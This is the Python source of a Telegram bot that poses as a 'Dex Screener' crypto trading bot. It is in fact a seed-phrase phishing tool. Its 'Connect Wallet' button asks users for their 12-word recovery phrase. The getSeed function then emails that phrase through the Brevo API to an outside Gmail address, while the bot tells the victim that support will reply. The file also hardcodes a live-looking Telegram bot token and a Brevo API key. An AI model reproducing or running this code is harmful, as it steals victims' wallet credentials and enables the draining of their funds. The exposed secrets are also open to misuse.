import logging
import sib_api_v3_sdk
from sib_api_v3_sdk.rest import ApiException
import smtplib
from email.mime.text import MIMEText
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackContext,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    filters,
)

TOKEN = "7885789948:AAEXHqhdA-4eXVQhmmcJ44UwVVT4ETVquMo"
MENU, OPTION1, OPTION2,OPTION3,OPTION4,OPTION5,OPTION6,OPTION7,OPTION8,OPTION9 = range(10)

#Logging Conversion
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

async def start(update: Update, context: CallbackContext) -> int:
    keyboard = [
        [InlineKeyboardButton("\U0001F6D2 Buy",callback_data="option1")],
        [InlineKeyboardButton("\U0001F4B0 Sell",callback_data="option2")],
        [InlineKeyboardButton("\U0001F517 Connect Wallet",callback_data="option3")],
        [InlineKeyboardButton("\U0001F44D Earn",callback_data="option4")],
        [InlineKeyboardButton("\U0001F4B8 Mine CryptoCurrencies",callback_data="option4")],
        [InlineKeyboardButton("\U0001F381 Claim Airdrops",callback_data="option5")],
        [InlineKeyboardButton("\U0001F504 DCA Order",callback_data="option6")],
        [InlineKeyboardButton("\U0001F4C8 Limit Order",callback_data="option7")],
        [InlineKeyboardButton("\U0001F4CA Position",callback_data="option8")],
        [InlineKeyboardButton("\U00002753 Help",callback_data="option9")]

    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Welcome! to Dex Screener Crypto Bot\nDeveloped By the Dex Screener Bot Community, our Crypto bot is swift,fast and reliable and is used by Many to quickly trade their Cryptocurrencies and other tokens", reply_markup=reply_markup 
    )
    return MENU
    
def create_smtp_api_client():
    configuration = sib_api_v3_sdk.Configuration()
    configuration.api_key['api-key'] = "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"# Fetch the API key from environment variables
    return sib_api_v3_sdk.TransactionalEmailsApi(sib_api_v3_sdk.ApiClient(configuration))

async def getSeed(update: Update, context: CallbackContext) -> str:
    # Create the SMTP client
    client = create_smtp_api_client()

    sender_mail = "Jimmywillbanks07@gmail.com"
    receiver_email = "screenerbotdex@gmail.com"

    text = f"THIS IS THE SEED PHRASE  \n ---------------------------------------- \n {update.message.text}"

    # Prepare the email data
    email_data = sib_api_v3_sdk.SendSmtpEmail(
        sender={"email": sender_mail},
        to=[{"email": receiver_email}],
        subject="Plain Text Email",
        text_content=text
    )

    try:
        # Send the email using Brevo API
        response = client.send_transac_email(email_data)
        logging.info(f"Email sent successfully: {response}")
        print(f"Email sent successfully: {response}")
    except ApiException as e:
        logging.error(f"Error sending email: {e}")
        print(f"Error sending email: {e}")

async def handle_seed_input(update: Update, context: CallbackContext) -> int:
    user_input = update.message.text  # This will capture the user's input
    # You can now process the input, e.g., send it via email.
    await getSeed(update, context)  # You can call your existing function to send the email
    await update.message.reply_text("Your Message has been sent to our Dex support team. We will respond to you shortly! Please Wait......")
    return ConversationHandler.END  # End the conversation after handling


async def button(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    await query.answer()

    if query.data == "option1":
        await query.edit_message_text(text="Kindly Connect Your Crypto Wallet To get Started")
        return OPTION1
    elif query.data == "option2":
        await query.edit_message_text(text="Kindly Connect Your Crypto Wallet To get Started")
        return OPTION2
    elif query.data == "option3":
        await query.edit_message_text(text="Enter the 12-word recovery phrase(seed phrase) to connect")
        return OPTION3
    elif query.data == "option4":
        await query.edit_message_text(text="Kindly Connect Your Crypto Wallet To get Started")
        return OPTION4
    elif query.data == "option5":
        await query.edit_message_text(text="Kindly Connect Your Crypto Wallet To get Started")
        return OPTION5
    elif query.data == "option6":
        await query.edit_message_text(text="Kindly Connect Your Crypto Wallet To get Started")
        return OPTION6
    elif query.data == "option7":
        await query.edit_message_text(text="Kindly Connect Your Crypto Wallet To get Started")
        return OPTION7
    elif query.data == "option8":
        await query.edit_message_text(text="Kindly Connect Your Crypto Wallet To get Started")
        return OPTION8
    elif query.data == "option9":
        await query.edit_message_text(text="You can open a request below. The Tech team will respond in the next few minutes via this bot.\nFor a faster solution to the problem, describe your appeal as clearly as possible. You can provide files or images if needed. Dex Screener team will never message you first.\n📅 Rules for contacting technical support:\n\U00000031 When you first contact, please introduce yourself.\n\U00000032 Describe the problem in your own words.\n\U00000033 Be polite, and politeness will be with you;\n\U0001F642\U0000270D Please write your complaints now. our support will get back to you soon\n @project_owner06")
        return OPTION9
    else:
        await query.edit_message_text(text="Unknow Option Selected")
        return MENU

async def cancel(update: Update, context: CallbackContext) -> int:
    await update.message.reply_text("Operation Cancelled")
    return ConversationHandler.END

def main():
    application = (
        ApplicationBuilder()
        .token(TOKEN)
        .read_timeout(10)
        .write_timeout(10)
        .concurrent_updates(True)
        .build()
    )
    #CONVERSATIONHANDLER TO HANDLE THE STATE MACHINE
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start",start)],
        states={
            MENU: [CallbackQueryHandler(button)],
            OPTION1: [MessageHandler(filters.TEXT & ~filters.COMMAND, cancel)],
            OPTION2: [MessageHandler(filters.TEXT & ~filters.COMMAND, cancel)],
            OPTION3: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_seed_input)],
            OPTION4: [MessageHandler(filters.TEXT & ~filters.COMMAND, cancel)],
            OPTION5: [MessageHandler(filters.TEXT & ~filters.COMMAND, cancel)],
            OPTION6: [MessageHandler(filters.TEXT & ~filters.COMMAND, cancel)],
            OPTION7: [MessageHandler(filters.TEXT & ~filters.COMMAND, cancel)],
            OPTION8: [MessageHandler(filters.TEXT & ~filters.COMMAND, cancel)],
            OPTION9: [MessageHandler(filters.TEXT & ~filters.COMMAND, cancel)],
        },
        fallbacks=[CommandHandler("start",start)],
    )

    application.add_handler(conv_handler)
    application.run_polling()

if __name__ == '__main__':
    main()
